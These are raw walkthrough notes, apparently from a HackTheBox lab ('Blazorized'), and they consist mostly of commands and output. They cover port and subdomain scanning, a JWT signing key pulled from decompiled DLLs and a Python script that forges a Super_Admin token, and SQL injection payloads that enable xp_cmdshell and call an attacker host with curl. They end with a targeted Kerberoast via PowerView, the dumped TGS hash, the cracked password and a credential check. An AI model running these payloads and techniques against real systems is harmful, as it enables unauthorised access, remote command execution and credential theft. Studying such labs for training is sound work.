```
kali@kali ~> nmap -sC -sV -Pn 10.129.151.78
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-02 03:48 EDT
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Stats: 0:02:06 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 81.15% done; ETC: 03:51 (0:00:30 remaining)
Stats: 0:03:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.84% done; ETC: 03:51 (0:00:00 remaining)
Stats: 0:03:36 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.36% done; ETC: 03:52 (0:00:00 remaining)
Nmap scan report for 10.129.151.78
Host is up (0.64s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://blazorized.htb
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-02 07:51:18Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
464/tcp  open  tcpwrapped
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1115.00; RC0+
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-07-01T18:04:31
|_Not valid after:  2054-07-01T18:04:31
| ms-sql-ntlm-info:
|   10.129.151.78:1433:
|     Target_Name: BLAZORIZED
|     NetBIOS_Domain_Name: BLAZORIZED
|     NetBIOS_Computer_Name: DC1
|     DNS_Domain_Name: blazorized.htb
|     DNS_Computer_Name: DC1.blazorized.htb
|     DNS_Tree_Name: blazorized.htb
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.129.151.78:1433:
|     Version:
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1115.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|_    TCP port: 1433
3268/tcp open  ldap
3269/tcp open  tcpwrapped
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-07-02T07:52:18
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 239.94 seconds

```



```
kali@kali ~/ADenum (master)> nxc smb blazorized.htb -u '' -p ''
SMB         10.129.151.78   445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:blazorized.htb) (signing:True) (SMBv1:False)
SMB         10.129.151.78   445    DC1              [+] blazorized.htb\:
```


```
kali@kali ~> ffuf -u http://blazorized.htb/ -H 'Host: FUZZ.blazorized.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 144

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://blazorized.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.blazorized.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 144
________________________________________________

admin                   [Status: 200, Size: 2037, Words: 149, Lines: 28, Duration: 152ms]
```



```
GET /posts HTTP/1.1

Host: api.blazorized.htb

authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlBvc3RzX0dldF9BbGwiLCJDYXRlZ29yaWVzX0dldF9BbGwiXSwiZXhwIjoxNzE5OTI2Njk0LCJpc3MiOiJodHRwOi8vYXBpLmJsYXpvcml6ZWQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5ibGF6b3JpemVkLmh0YiJ9.TzLQiTWIlwFkiNATmeiLOP56VUERUcqO7ceDaD5nMbPHoK7RrMZQ5WWGPBxoTpq27f4TUbi71ZHmPEfGJAaN6Q

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36

Accept: */*

Sec-GPC: 1

Accept-Language: en-US,en;q=0.9

Origin: http://blazorized.htb

Referer: http://blazorized.htb/

Accept-Encoding: gzip, deflate, br

Connection: close




```


the response
```
HTTP/1.1 200 OK

Content-Type: application/json

Server: Microsoft-IIS/10.0

Access-Control-Allow-Origin: *

Date: Tue, 02 Jul 2024 13:24:24 GMT

Connection: close

Content-Length: 12160



{"Posts":[{"ID":"1c391f9c-fd3e-4d86-b966-9a3e5d7e3d28","Title":"Active Directory","MarkdownContent":"Below are links to projects and posts relating AD red-teaming:\r\n\r\n- https://github.com/Group3r/Group3r\r\n- https://github.com/Leo4j/Amnesiac\r\n- https://github.com/JPG0mez/ADCSync\r\n- https://github.com/Processus-Thief/HEKATOMB\r\n- https://github.com/Mazars-Tech/AD_Miner\r\n- https://github.com/AlmondOffSec/PassTheCert\r\n- https://github.com/synacktiv/ntdissector\r\n- https://github.com/Hackndo/pyGPOAbuse\r\n- https://exploit.ph/external-trusts-are-evil.html\r\n- https://github.com/SecuraBV/Timeroast\r\n- https://github.com/SadProcessor/CypherDog\r\n- https://mayfly277.github.io/","CategoryID":"9a445790-f7e8-4351-8cf4-46fcae383eec"},{"ID":"07e6eeae-7e59-40ff-a4fa-b1ea98b1b5d4","Title":"Active Directory","MarkdownContent":"Below are links to projects and posts relating AD blue-teaming:\r\n\r\n- https://github.com/lkarlslund/Adalanche\r\n- https://github.com/FalconForceTeam/FalconHound\r\n- https://github.com/csababarta/ntdsxtract\r\n- https://github.com/adrecon/ADRecon","CategoryID":"d8f945f9-2d12-4691-acfb-a9cef2f9b23c"},{"ID":"efd307ef-cbeb-4b38-8ccb-4a2dfc4d09a9","Title":"arXiv","MarkdownContent":"[arXiv](https://arxiv.org/) is among the best websites (**usenix.org** tops it) to stay up to date with the latest research papers from all around the globe. They have a range of research subjects, including those belonging to:\r\n\r\n- [Mathematics](https://arxiv.org/archive/math)\r\n- [Computer Science](https://info.arxiv.org/help/cs/index.html)\r\n- [Electrical Engineering and Systems Science](https://arxiv.org/archive/eess)","CategoryID":"9bd1d7a7-53c9-4e76-9aa5-bd93d60c4579"},{"ID":"9d9f8a1c-bd0e-4ec6-8b87-4ad7662d2fc3","Title":"Concepts of Programming Languages","MarkdownContent":"**Concepts of Programming Languages** by **Robert W. Sebesta** is one of the _best_ programming languages books: it combines strong theoretical knowledge and practical examples. However, the language used in the book is not for the beginner; instead, it suits a CS student in their second or last year.","CategoryID":"6c9f2b96-6f80-4e48-8169-ac2cc2d06260"},{"ID":"51f96e88-da50-453d-9a37-2bb847c868ab","Title":"Cryptography and Security","MarkdownContent":"The [Cryptography and Security](https://arxiv.org/list/cs.CR/recent) section of `arXiv` is top-notch to stay educated about state of the art cryptography and computer security research papers. \r\n\r\nHowever, sometimes the papers published there are of poor quality (and even some seem to be generated by a GPT model). Therefore, the reader should take precautions and not trust everything stated in these research papers blindly.","CategoryID":"9bd1d7a7-53c9-4e76-9aa5-bd93d60c4579"},{"ID":"171d6389-4fec-48f8-b571-2d6ca372bf8c","Title":"IEEE Symposium on Security and Privacy","MarkdownContent":"[IEEE Computer Society's Technical Community on Security and Privacy](https://www.ieee-security.org/) stands as a prominent hub for cutting-edge security research. Annually, it orchestrates the [IEEE Symposium on Security and Privacy](https://sp2023.ieee-security.org/past.html), a pinnacle event in the realm of security research. The most recent one, the [44th IEEE Symposium on Security and Privacy](https://sp2023.ieee-security.org/past.html), showcased the latest advancements in the field. While direct access to the [accepted research papers](https://sp2023.ieee-security.org/program-papers.html) is not provided, one can explore presentations by the researchers on the [IEEE Symposium on Security and Privacy](https://www.youtube.com/@ieeesymposiumonsecurityand3919) YouTube channel. Additionally, one can search for specific research paper titles online to read them.","CategoryID":"2a35aa74-87f0-4a22-8c9a-8a10f4856f43"},{"ID":"09ebf3a0-2cd4-4677-b746-033113ec2009","Title":"Interesting Digital Gardens","MarkdownContent":"There are various interesting digital gardens on the web, including:\r\n\r\n- https://gwern.net/\r\n- https://100r.co/site/home.html\r\n- https://okmij.org/ftp/\r\n- https://notes.eatonphil.com/\r\n\r\nThere are many others found at https://wiki.nikiv.dev/other/wiki-workflow#similar-wikis-i-liked","CategoryID":null},{"ID":"baac3b95-c972-4b8b-a158-88c483267b5d","Title":"Misc. Links","MarkdownContent":"Due to the nature of my job, I must constantly stay up to date with the latest trends and topics in Computer Science and Cyber Security. Below are miscellaneous links that I will have to organize and categorize in the future:\r\n\r\n- https://zod.dev\r\n- https://github.com/fkasler/cuddlephish\r\n- https://github.com/stacklok/minder\r\n- https://docs.stacklok.com/trusty\r\n- https://gotenberg.dev/\r\n- https://github.com/megeeky/SharpWebServer\r\n- https://github.com/SpecterOps/Nemesis\r\n- https://github.com/werdhaihai/AtlasReaper\r\n- https://www.first.org/cvss/v4-0/index.html\r\n- https://github.com/hktalent/scan4all\r\n- https://github.com/sAjibuu/Upload_Bypass\r\n- https://github.com/0xKayala/NucleiFuzzer\r\n- https://gittuf.github.io/\r\n- https://github.com/Shopify/toxiproxy\r\n- https://github.com/Hackndo/pyGPOAbuse\r\n- https://github.com/neondatabase/neon\r\n- https://thegreycorner.com/offsecfeed/\r\n- https://github.com/canix1/ADACLScanner\r\n- https://www.learndmarc.com/\r\n- https://itnext.io/\r\n- https://cisecurity.org/cis-benchmarks\r\n- https://hertzbleed.com/gpu.zip/\r\n- htttps://github.com/cure53/HTTPLeaks\r\n- https://kakoune.org\r\n- https://cure53.de/\r\n- https://www.subdomain.center/\r\n- https://whonix.org/\r\n- https://www.qubes-os.org/\r\n- https://jsdoc.app/\r\n- https://orbstack.dev/\r\n- http://www.textfiles.com/100/hack_ths.txt\r\n- https://github.com/liveblocks/liveblocks\r\n- https://github.com/tsl0922/ttyd\r\n- https://github.com/supabase/supabase\r\n- https://www.hahwul.com/\r\n- https://asgi.readthedocs.io/en/latest/\r\n- https://yew.rs/\r\n- https://pentest-standard.readthedocs.io/en/latest/tree.thml\r\n- https://huggingface.co/\r\n- https://stellar.org\r\n- https://secret.club/\r\n- https://github.com/praetorian-inc/Matryoshka\r\n- https://about.sourcegraph.com/cody\r\n- https://github.com/exogee-technology/graphweaver\r\n- https://decentraleyes.org/\r\n- https://htmx.org/\r\n- https://gohugo.io\r\n- https://chat.lmsys.org/\r\n- https://www.perplexity.ai/\r\n- https://caido.io/\r\n- https://infocondb.org/\r\n- https://comsec.ethz.ch/publications/\r\n- https://github.com/Sq00ky/LeetLinked\r\n- https://downfall.page/\r\n- https://ironpython.net/\r\n- https://github.com/Nariod/RustPacker\r\n- https://github.com/RedTeamPentesting/resocks\r\n- https://github.com/Significant-Gravitas/Auto-GPT\r\n- https://github.com/bee-san/pyWhat\r\n- https://github.com/login-securite/DonPAPI\r\n- https://kaitai.io/\r\n- https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team\r\n- https://github.com/mxrch/GHunt\r\n- https://github.com/mxrch/GitFive\r\n- https://github.com/klezVirus/SysWhispers3\r\n- https://github.com/giuliano108/SeBackupPrivilege\r\n- https://github.com/Krypteria/Ant\r\n- https://github.com/SadProcessor/CypherDog","CategoryID":null},{"ID":"6208bb94-c96d-4181-8464-17fdbcd31f0c","Title":"Platforms","MarkdownContent":"[HackTheBox](https://www.hackthebox.com/) is one of the most realistic platforms to learn about red-teaming and hacking. Their [Academy](https://academy.hackthebox.com/) has top-notch red-teaming modules, with the prime examples being [DACL Attacks I](https://academy.hackthebox.com/course/preview/dacl-attacks-i) and [NTLM Relay Attacks](https://academy.hackthebox.com/course/preview/ntlm-relay-attacks).","CategoryID":"9a445790-f7e8-4351-8cf4-46fcae383eec"},{"ID":"e4113cc1-f461-4303-9428-1aad0341e8e8","Title":"Theory","MarkdownContent":"Cybersecurity is the art of abusing CS knowledge to achieve various end-goals, most importantly, offensive security engagements objectives.","CategoryID":"c5ea5494-d606-4d8d-8979-1065dc67971d"},{"ID":"8f0007a4-00de-486e-9a5e-e92048c280bf","Title":"Uncategorized","MarkdownContent":"The below research papers are uncategorized, and are to be investigated later:\r\n\r\n- https://thume.ca/2023/12/02/tracing-methods/\r\n- https://zakird.com/papers/tangled_web.pdf\r\n- https://jhalderm.com/pub/papers/censys-ccs15.pdf\r\n- https://jhalderm.com/pub/papers/zmap10gig-woot14.pdf\r\n- https://zakird.com/papers/lzr.pdf\r\n- https://zakird.com/papers/zlint.pdf\r\n- https://zakird.com/papers/zdns.pdf","CategoryID":"916d0f55-43da-4f66-9ce0-48cdb3f956d6"},{"ID":"ca8b2dda-a164-4ea0-a29a-cf64b5ad01e5","Title":"usenix.org","MarkdownContent":"The [USENIX](https://www.usenix.org/) Association is nonprofit organization, dedicated to supporting the advanced computing systems communities and furthering the reach of innovative research. They hold a large number of [conferences](https://www.usenix.org/conferences), with the [32nd USENIX Security Symposium](https://www.usenix.org/conference/usenixsecurity23) being the latest USENIX Security one. The research paper accepted in this year's symposium, which are very educational and of extremely _high academic standards_, can be found at:\r\n\r\n- [USENIX Security '23 Summer Accepted Papers](https://www.usenix.org/conference/usenixsecurity23/summer-accepted-papers)\r\n- [USENIX Security '23 Fall Accepted Papers](https://www.usenix.org/conference/usenixsecurity23/fall-accepted-papers)","CategoryID":"92824cd1-4c94-46e6-a982-96c9c8e0b20c"},{"ID":"f78c5361-440a-4b68-b8ef-ae47e066222b","Title":"ZMap Project","MarkdownContent":"The [ZMap Project](https://zmap.io/research) has several important research papers to read:\r\n\r\n- https://zakird.com/papers/mirai.pdf\r\n- [Global Measurement of DNS Manipulation](https://faculty.cc.gatech.edu/~pearce/papers/dns_usenix_2017.pdf)\r\n- [Augur: Internet-Wide Detection of Connectivity Disruptions](https://faculty.cc.gatech.edu/~pearce/papers/augur_oakland_2017.pdf)\r\n- [To Catch a Ratter: Monitoring the Behavior of Amateur DarkComet RAT Operators in the Wild](https://faculty.cc.gatech.edu/~pearce/papers/rats_oakland_2017.pdf)\r\n- [An Internet-Wide View of ICS Devices](https://zakird.com/papers/scada.pdf)\r\n- [DROWN: Breaking TLS using SSLv2](https://drownattack.com/drown-attack-paper.pdf)\r\n- [You’ve Got Vulnerability: Exploring Effective Vulnerability Notifications](https://zakird.com/papers/sec16-vuln-notifications.pdf)\r\n- [FTP: The Forgotten Cloud](https://zakird.com/papers/dsn-ftp.pdf)\r\n- [Neither Snow Nor Rain Nor MITM . . . An Empirical Analysis of Email Delivery Security](https://jhalderm.com/pub/papers/mail-imc15.pdf)\r\n- [Imperfect Forward Secrecy: How Diffie-Hellman Fails in Practice](https://weakdh.org/imperfect-forward-secrecy-ccs15.pdf)\r\n- [A Messy State of the Union: Taming the Composite State Machines of TLS](https://inria.hal.science/hal-01114250/document)\r\n- [The Matter of Heartbleed](https://jhalderm.com/pub/papers/heartbleed-imc14.pdf)\r\n- [When Governments Hack Opponents: A Look at Actors and Technology](https://www.icir.org/vern/papers/govhack.usesec14.pdf)\r\n- [An Internet-Wide View of Internet-Wide Scanning](https://jhalderm.com/pub/papers/scanning-sec14.pdf)\r\n- [TapDance: End-to-Middle Anticensorship without Flow Blocking](https://jhalderm.com/pub/papers/tapdance-sec14.pdf)\r\n- [Zippier ZMap: Internet-Wide Scanning at 10 Gbps](https://jhalderm.com/pub/papers/zmap10gig-woot14.pdf)\r\n- [Analysis of the HTTPS Certificate Ecosystem∗](https://jhalderm.com/pub/papers/https-imc13.pdf)\r\n- [Illuminating the Security Issues Surrounding Lights-Out Server Management](https://jhalderm.com/pub/papers/ipmi-woot13.pdf)\r\n- [CAge: Taming Certificate Authorities by Inferring Restricted Scopes](https://jhalderm.com/pub/papers/cage-fc13.pdf)\r\n- [Elliptic Curve Cryptography in Practice](https://cryptome.org/2013/11/ecc-practice.pdf)\r\n- [Mining Your Ps and Qs: Detection of Widespread Weak Keys in Network Devices](https://factorable.net/paper.html)\r\n- [Hacking Team and the Targeting of Ethiopian Journalists](https://citizenlab.ca/2014/02/hacking-team-targeting-ethiopian-journalists/)","CategoryID":"916d0f55-43da-4f66-9ce0-48cdb3f956d6"}]}
```

in the header

```
eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlBvc3RzX0dldF9BbGwiLCJDYXRlZ29yaWVzX0dldF9BbGwiXSwiZXhwIjoxNzE5OTI2Njk0LCJpc3MiOiJodHRwOi8vYXBpLmJsYXpvcml6ZWQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5ibGF6b3JpemVkLmh0YiJ9.TzLQiTWIlwFkiNATmeiLOP56VUERUcqO7ceDaD5nMbPHoK7RrMZQ5WWGPBxoTpq27f4TUbi71ZHmPEfGJAaN6Q
```

```

```

```
As mentioned earlier by someone else: vscode + ilspy-vscode plugin. Then download and look at DLLs with a name “Blazorized.*”
```




```
// Blazorized.Helpers.JWT  
// Token: 0x04000006 RID: 6  
private static readonly string jwtSymmetricSecurityKey = "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a";
```


```
// Blazorized.Helpers.JWT  
// Token: 0x04000007 RID: 7  
private static readonly string superAdminEmailClaimValue = "superadmin@blazorized.htb";
```

```
// Blazorized.Helpers.JWT  
// Token: 0x0400000A RID: 10  
private static readonly string superAdminRoleClaimValue = "Super_Admin";
```


```
import jwt

jwtSymmetricSecurityKey = "<Key>"

payload = {

 "iss": 'http://api.blazorized.htb',

"aud": 'http://admin.blazorized.htb',

"exp": 7777777777777,

 "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": 'superadmin@blazorized.htb',

"http://schemas.microsoft.com/ws/2008/06/identity/claims/role": 'Super_Admin'

}

token = jwt.encode(payload, jwtSymmetricSecurityKey, algorithm="HS512")

print("Generated JWT token:")

print(token)

```


after this store it in local storage

```
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'ipconfig';
```

```
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'curl 10.10.14.7'';
```


```
EXEC/*comment*/sp_configure/*comment*/'xp_cmdshell',/*comment*/1;/*comment*/RECONFIGURE;/*comment*/EXEC/*comment*/xp_cmdshell/*comment*/'curl 10.10.14.7'';
```

```
1' AND EXEC sp_configure 'xp_cmdshell', 1;  WAITFOR DELAY '0:0:02'-- -
```


```
1' AND EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; AND EXEC xp_cmdshell 'powershell.exe curl http://10.10.14.7/';-- -
```

```
1' EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell.exe curl http://10.10.14.7/';-- -
```



```
Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
```


```
Set-DomainObject -Identity 'RSA_4810' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}
```

```
$User = Get-DomainUser 'RSA_4810' 
$User | Get-DomainSPNTicket | fl
```


```
PS C:\Users\NU_1055> $User = Get-DomainUser 'RSA_4810'
$User = Get-DomainUser 'RSA_4810'
PS C:\Users\NU_1055> $User | Get-DomainSPNTicket | fl
$User | Get-DomainSPNTicket | fl


SamAccountName       : RSA_4810
DistinguishedName    : CN=RSA_4810,CN=Users,DC=blazorized,DC=htb
ServicePrincipalName : nonexistent/BLAHBLAH
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*RSA_4810$blazorized.htb$nonexistent/BLAHBLAH*$6107D97FBD349F46A1E4E623D4DAD6E6$3CC7
                       C85626EE06599AC534A7A528FA90B4D0F2067B99D2D1A2A6FA975AB95F1B7192D6655DE019989A1C726354F868A00497
                       A3AFCD71B6630607FAB6B260EC225DDE94E10ECB51AB868907406B6E22E4C88FF9C7E98C69A63660E0FC47A5E235D6F7
                       39EE440B14A9D610D11B2BE6D1803CB01D55B331C2D283F2C5D62B5451B8F1001D17DACB2927E9DE7879D502514C95CF
                       19BCC163463B47CAAEE841F9F5E330ABB23859436A56F908B8A98CF8E5D3FD6C396C5B3B4D6CCE153FBBE03B644B68EC
                       81AE233A95E47D695FE5DBB6BB5A069A0909F1FA441BCED47546DEDAF3F56BFDC72F3F6B808D5945B6B50641A15C1837
                       D8C909D2FC9A8F659FCF69D89FD4FBCE4DC889DD3398EE94B285332BBD65B108203CB721FB3166CB3E9D3A92E44FA089
                       28C86DEC699397A82E3F66ACE86C2D9C147884092E0773272DA4D70AE8D6B5B135CCDD1ED69D79FD98A6759F78220374
                       A063C9889A93FE01D228A4D1F8F948456B1E58F5F4A33717DC759299480A989678D123791DB9440CD9ECFCFEB595EA1D
                       4061B826F1353362D05C56456B90F6658D7D673C648ED240A5FE253368609C1B2804F7E8215E53BDE8F6E67A058D3E13
                       777BEAC6DB5D488DDFC7B9A9AD564BE307AFB4CB9C9D8F8393C4E9FA1DF043FC602F89A5D40D1774A73AE8D7DC0B8616
                       10F53F5DF9B1D8505C4C4201C35E1E421FBF61C0112889DCFE296BD9B7F35758066FB01E0182A43D6980300FBDDE8342
                       99F89263E30E0CE0A2B79D0111E7ED0D9CAC6854EC7302E3A5119AF904DCA35A0271A11809E7F57B84616D7F54E12089
                       3FCE73B79A72EB8A96C07F55712CC40F225764987FDF25B8D40DE8382944A888D53721DA4E029ED2F7CE66CAFCE221CA
                       859B8FBEAE79BD77C1BE55B3447917CD37E5A9877EDF5D871D812FA2D86B394E0EC263F9DD91E7A3C9892DE94C1D9AF7
                       C84DA79A4046C1F669C45D6765E7B77F964353EA7000D6710E70CE271C91AA5FF411B88A78047B4B21CCA596831C379A
                       DB02D164A5691588424C59183CE1195B751812FA2637EC88A6743CA013BB8FC798B9EC9D829920E7D498025D95AE3F2D
                       45C9449C9D55A4F1B0CEB593F6FB92BF987E3980E21CAEE5D712C31690CF1045ABB821BB3FB0188AC545E475B1FB9E1B
                       3CDBA4C17483A7E0B8CCE19C624D516C683C1C173841041912E8403B3B9AF7FF6F34B65EFD61E909FDB51FDFFB77EA10
                       0A8F22B310055B808747E57F0AD60CAAB4B5526E66B3F89D7D0943F4C2097E1034DB6EE38C5823A5F2AE62089110E6D8
                       32FCB255490317C74E28DC61E765951D533E78B8990D741955B84D8699E26D8E5C04B4922BCA1D59455774B74F0C098D
                       05DD7B9F58CC2545B045D847DFBDE810D9538D7C2C13EFFAFCF9E934D33A53A70E26C111E312B31E985453C3ECFBC420
                       FAF369E8703FB0F3282C6CEA47CA2487A6F09257A5E65B4E345DE320FE58A179C8158E18F258B0436B7CA0EF1760DFED
                       CF2018961065E329C36F0C33D6C24613888005B23255FE19A955A450173E8345351B3C9323C8685BB87CEDFFFA47EC4F
                       2F95B39BC1EA954D1BEC547C618BDF9EF67857FB710C32D7534128766B183B27448BEBB4DE4D6D4B4DDD3DCC28244CEA
                       929352A56D79954C4068F689D1C9516E82927AEFAB67A07150F9D3BC6791F09C233F69067049B3A57D2EC66C7705F386
                       6B640C3B0495A78B71A91542EBD2E56EDA8875BA30ED363692624A8819184F4B3AC37A5C0DBB70236001655052C1B573
                       0540BE278317




```

```
$krb5tgs$23$*RSA_4810$blazorized.htb$nonexistent/BLAHBLAH*$6107d97fbd349f46a1e4e623d4dad6e6$3cc7c85626ee06599ac534a7a528fa90b4d0f2067b99d2d1a2a6fa975ab95f1b7192d6655de019989a1c726354f868a00497a3afcd71b6630607fab6b260ec225dde94e10ecb51ab868907406b6e22e4c88ff9c7e98c69a63660e0fc47a5e235d6f739ee440b14a9d610d11b2be6d1803cb01d55b331c2d283f2c5d62b5451b8f1001d17dacb2927e9de7879d502514c95cf19bcc163463b47caaee841f9f5e330abb23859436a56f908b8a98cf8e5d3fd6c396c5b3b4d6cce153fbbe03b644b68ec81ae233a95e47d695fe5dbb6bb5a069a0909f1fa441bced47546dedaf3f56bfdc72f3f6b808d5945b6b50641a15c1837d8c909d2fc9a8f659fcf69d89fd4fbce4dc889dd3398ee94b285332bbd65b108203cb721fb3166cb3e9d3a92e44fa08928c86dec699397a82e3f66ace86c2d9c147884092e0773272da4d70ae8d6b5b135ccdd1ed69d79fd98a6759f78220374a063c9889a93fe01d228a4d1f8f948456b1e58f5f4a33717dc759299480a989678d123791db9440cd9ecfcfeb595ea1d4061b826f1353362d05c56456b90f6658d7d673c648ed240a5fe253368609c1b2804f7e8215e53bde8f6e67a058d3e13777beac6db5d488ddfc7b9a9ad564be307afb4cb9c9d8f8393c4e9fa1df043fc602f89a5d40d1774a73ae8d7dc0b861610f53f5df9b1d8505c4c4201c35e1e421fbf61c0112889dcfe296bd9b7f35758066fb01e0182a43d6980300fbdde834299f89263e30e0ce0a2b79d0111e7ed0d9cac6854ec7302e3a5119af904dca35a0271a11809e7f57b84616d7f54e120893fce73b79a72eb8a96c07f55712cc40f225764987fdf25b8d40de8382944a888d53721da4e029ed2f7ce66cafce221ca859b8fbeae79bd77c1be55b3447917cd37e5a9877edf5d871d812fa2d86b394e0ec263f9dd91e7a3c9892de94c1d9af7c84da79a4046c1f669c45d6765e7b77f964353ea7000d6710e70ce271c91aa5ff411b88a78047b4b21cca596831c379adb02d164a5691588424c59183ce1195b751812fa2637ec88a6743ca013bb8fc798b9ec9d829920e7d498025d95ae3f2d45c9449c9d55a4f1b0ceb593f6fb92bf987e3980e21caee5d712c31690cf1045abb821bb3fb0188ac545e475b1fb9e1b3cdba4c17483a7e0b8cce19c624d516c683c1c173841041912e8403b3b9af7ff6f34b65efd61e909fdb51fdffb77ea100a8f22b310055b808747e57f0ad60caab4b5526e66b3f89d7d0943f4c2097e1034db6ee38c5823a5f2ae62089110e6d832fcb255490317c74e28dc61e765951d533e78b8990d741955b84d8699e26d8e5c04b4922bca1d59455774b74f0c098d05dd7b9f58cc2545b045d847dfbde810d9538d7c2c13effafcf9e934d33a53a70e26c111e312b31e985453c3ecfbc420faf369e8703fb0f3282c6cea47ca2487a6f09257a5e65b4e345de320fe58a179c8158e18f258b0436b7ca0ef1760dfedcf2018961065e329c36f0c33d6c24613888005b23255fe19a955a450173e8345351b3c9323c8685bb87cedfffa47ec4f2f95b39bc1ea954d1bec547c618bdf9ef67857fb710c32d7534128766b183b27448bebb4de4d6d4b4ddd3dcc28244cea929352a56d79954c4068f689d1c9516e82927aefab67a07150f9d3bc6791f09c233f69067049b3a57d2ec66c7705f3866b640c3b0495a78b71a91542ebd2e56eda8875ba30ed363692624a8819184f4b3ac37a5c0dbb70236001655052c1b5730540be278317:(Ni7856Do9854Ki05Ng0005 #)

```

```
kali@kali ~ [2]> netexec smb blazorized.htb ldap -u 'RSA_4810' -p '(Ni7856Do9854Ki05Ng0005 #)'
SMB         10.10.11.22     445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:blazorized.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.22     445    DC1              [+] blazorized.htb\RSA_4810:(Ni7856Do9854Ki05Ng0005 #)
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
